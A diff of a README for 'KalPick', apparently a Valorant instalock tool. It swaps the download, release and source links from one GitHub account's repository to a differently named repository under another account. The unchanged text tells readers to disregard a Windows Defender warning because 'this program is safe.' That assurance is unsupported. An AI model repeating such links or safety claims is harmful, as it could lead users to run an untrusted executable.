@@ -8,9 +8,9 @@
 > [!IMPORTANT]  
 > FOR EDUCATIONAL PURPOSES ONLY
 
-[Click this link to download.](https://github.com/MonkeySp1n/kalpick/releases/download/v1.0.0/kalpick.exe)
+[Click this link to download.](https://github.com/stark7k/valorant-instalock/releases/download/v2.0.0/KalPick.exe)
 
-[Release Contents](https://github.com/MonkeySp1n/kalpick/releases/tag/v1.0.0)
+[Release Contents](https://github.com/stark7k/valorant-instalock/releases)
 
 ## Windows Defender Warning
 
@@ -21,4 +21,4 @@ When running KalPick.exe for the first time, Windows Defender may show an "unkno
 
 This program is safe.
 
-The source code is [here](https://github.com/MonkeySp1n/kalpick/blob/main/src/main.py).
+The source code is [here](https://github.com/stark7k/valorant-instalock/blob/main/src/main.py).
